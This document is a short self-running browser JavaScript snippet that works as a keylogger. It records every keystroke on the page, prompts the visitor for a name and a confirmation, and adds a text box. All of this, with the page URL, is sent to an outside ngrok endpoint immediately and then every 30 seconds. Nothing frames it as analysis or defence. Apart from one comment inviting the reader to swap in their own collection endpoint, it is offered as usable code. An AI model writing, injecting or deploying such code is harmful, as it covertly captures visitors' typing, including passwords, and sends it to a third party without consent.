(function() {
  'use strict';
  const keys = [];
  const collectedData = {
    name: null,
    keystrokes: [],
    url: window.location.href,
    confirmed: false,
    textInput: null  // Add this property for the text input value
  };

  function sendData(data) {
    // Replace with your own endpoint to collect data
    const endpoint = 'https://native-fully-elephant.ngrok-free.app/collect';
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(err => console.error('Data send error:', err));
  }

  function greet() {
    const name = prompt('Name:');
    if (name) {
      const greeting = document.createElement('a');
      greeting.textContent = 'Hello, ' + name + '!';
      document.body.appendChild(greeting);
      collectedData.name = name;
      return name;
    }
    return null;
  }

  function handleKeyDown(event) {
    const key = event.key || String.fromCharCode(event.keyCode);
    keys.push(key);
    collectedData.keystrokes = keys;
    console.log('Keys:', collectedData.keystrokes);
  }

  function addTextInput() {
    const input = document.createElement('input');
    input.type = 'text';
    input.placeholder = 'Enter some text';
    input.id = 'textInput';
    document.body.appendChild(input);

    // Update collectedData when the input value changes
    input.addEventListener('input', () => {
      collectedData.textInput = input.value;
    });
  }

  document.addEventListener('keydown', handleKeyDown);

  const inputName = greet();

  const confirmation = prompt('Thank you. Please confirm entry by typing "YES" below:');
  
  if (confirmation === 'YES') {
    console.log('Entry confirmed.');
    collectedData.confirmed = true;
  } else {
    console.log('Entry not confirmed.');
    collectedData.confirmed = false;
  }

  console.log('Persisted Value:', collectedData.name);

  // Add text input box
  addTextInput();

  // Send the collected data to the server initially
  sendData(collectedData);

  // Set up interval to send data every 30 seconds
  setInterval(() => {
    sendData(collectedData);
  }, 30000); // 30000 milliseconds = 30 seconds
})();
